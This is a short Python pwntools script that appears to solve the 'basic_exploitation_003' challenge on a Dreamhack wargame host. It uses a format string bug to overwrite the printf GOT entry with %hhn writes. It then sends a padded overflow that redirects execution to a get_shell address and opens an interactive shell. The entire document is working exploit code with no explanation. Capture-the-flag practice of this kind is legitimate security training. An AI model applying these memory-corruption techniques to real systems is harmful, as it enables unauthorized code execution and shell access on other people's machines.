from pwn import *

context.log_level = "debug"

p = remote("host3.dreamhack.games", 17295)
e = ELF("./basic_exploitation_003")

printf_got = e.got["printf"]

# With Format String Bug
payload = p32(printf_got) + p32(printf_got + 1)
payload += b"%%%dc" % (0x69 - 0x8)
payload += b"%1$hhn"
payload += b"%%%dc" % (0x86 - 0x69)
payload += b"%2$hhn"
p.send(payload)

# With Buffer Overflow
get_shell = 0x08048669
payload = b"%%%dc" % (0x98 + 0x4) + p32(get_shell)
p.send(payload)

p.interactive()
